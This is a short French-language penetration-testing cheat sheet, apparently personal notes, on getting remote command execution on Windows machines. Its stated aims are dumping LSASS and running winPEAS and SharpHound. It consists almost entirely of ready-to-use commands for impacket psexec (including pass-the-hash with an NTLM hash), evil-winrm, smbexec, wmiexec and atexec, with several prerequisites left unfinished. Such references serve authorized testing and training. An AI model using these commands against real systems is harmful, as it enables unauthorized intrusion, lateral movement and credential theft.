# Exécution de commandes

> Commandes pour réaliser de l'exécution de commandes sur une machine cible
>
> Objectifs :
>
> - exécuter des commandes sur le serveur
> - lire des fichiers internes au serveur
> - dump LSASS 
> - exécuter winPeas
> - exécuter des .exe (e.g. SharpHound pour utiliser BloodHound)



### PsExec

> Prérequis : Identifiants d'un utilisateur / hash NTLM (au moins admin local car nécessité d'écrire dans le share ADMIN$)
>

```bash
# Sur une machine client
$ impacket-psexec 'USERNAME:PASSWORD@<IP_CLIENT>'
# Hash LM vide : aad3b435b51404eeaad3b435b51404ee / Remplacer par hash LM s'il y en a un
$ impacket-psexec -hashes aad3b435b51404eeaad3b435b51404ee:<HASH_NT> 'USERNAME@<IP_CLIENT>'
```



### WinRM (evil-winrm)

> Prérequis : port 5985 / 5986 d'ouvert / un compte utilisateur
>
> Lorsque ce port est ouvert, possibilité d'obtenir un shell restreint via WinRM
>

```bash
$ evil-winrm -i <IP_VICT> -u <USERNAME> -p <PASSWORD> 

# Authentification avec certificat
$ evil-winrm -S -i <IP_VICT> -k <PRIV.KEY> -c <CERT.cer>
```



### SMBExec

> Prérequis : A creuser
>

```bash
$ python3 /usr/share/doc/python3-impacket/examples/smbexec.py '<DOMAIN.COM>/<USER>:<PASSWORD>?@<IP_CIBLE>'               
```



### WmiExec

> Prérequis : A creuser
>

```bash
$ python3 /usr/share/doc/python3-impacket/examples/wmiexec.py '<DOMAIN.COM>/<USER>:<PASSWORD>?@<IP_CIBLE>'               
```



### AtExec

> Prérequis : A creuser
>

```bash
# Commande : e.g. whoami
$ python3 /usr/share/doc/python3-impacket/examples/atexec.py '<DOMAIN.COM>/<USER>:<PASSWORD>?@<IP_CIBLE>' <COMMANDE>
```

